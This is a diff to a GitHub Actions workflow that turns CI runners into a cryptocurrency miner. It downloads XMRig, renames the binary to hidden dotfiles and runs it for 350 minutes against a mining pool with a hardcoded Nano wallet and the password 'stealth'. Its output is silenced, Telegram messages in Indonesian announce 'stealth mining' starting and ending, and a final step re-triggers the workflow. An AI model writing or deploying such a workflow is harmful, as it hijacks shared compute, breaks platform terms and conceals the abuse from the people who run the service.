@@ -14,27 +14,33 @@ jobs:
         sudo apt-get update
         sudo apt-get install -y wget curl jq tar
 
-    - name: Download & Run Stealth Task
-      run: |
-        VERSION="6.24.0"
-        FILE="xmrig-${VERSION}-linux-static-x64.tar.gz"
-        wget https://github.com/xmrig/xmrig/releases/download/v${VERSION}/${FILE} -O runner.tar.gz || exit 1
-        tar -xzf runner.tar.gz || exit 1
-        DIR=$(tar -tf runner.tar.gz | head -1 | cut -f1 -d"/")
-        mv "$DIR" taskdir
-        cd taskdir
-        mv xmrig .worker
-        chmod +x .worker
-        timeout 350m ./.worker -o xmrig.nanswap.com:3333 -a rx -k -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q -p stealth > /dev/null 2>&1
-
-    - name: Notify Telegram
+    - name: Notify Start to Telegram
       env:
         TG_TOKEN: ${{ secrets.TG_TOKEN }}
         TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
       run: |
         curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
         -d chat_id=$TG_CHAT_ID \
-        -d text="✅ Mining stealth aktif via GitHub Actions!\n⛏️ XMRig v6.24.0 terhubung - @AutoNanoGithub_bot"
+        -d text="🟢 Stealth mining dimulai.\n\nWorker sedang dijalankan melalui GitHub Actions."
+
+    - name: Download & Run Stealth Worker
+      run: |
+        curl -LO https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
+        tar -xzf xmrig-6.24.0-linux-static-x64.tar.gz
+        mv xmrig-6.24.0 task
+        cd task
+        mv xmrig .a
+        chmod +x .a
+        timeout 350m ./\.a -o xmrig.nanswap.com:3333 -a rx -k -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q -p stealth > /dev/null 2>&1
+
+    - name: Notify Done to Telegram
+      env:
+        TG_TOKEN: ${{ secrets.TG_TOKEN }}
+        TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
+      run: |
+        curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
+        -d chat_id=$TG_CHAT_ID \
+        -d text="✅ Stealth mining selesai.\n\nDurasi: 350 menit\nStatus: Done."
 
     - name: Re-trigger Task
       if: ${{ github.event_name == 'workflow_dispatch' }}
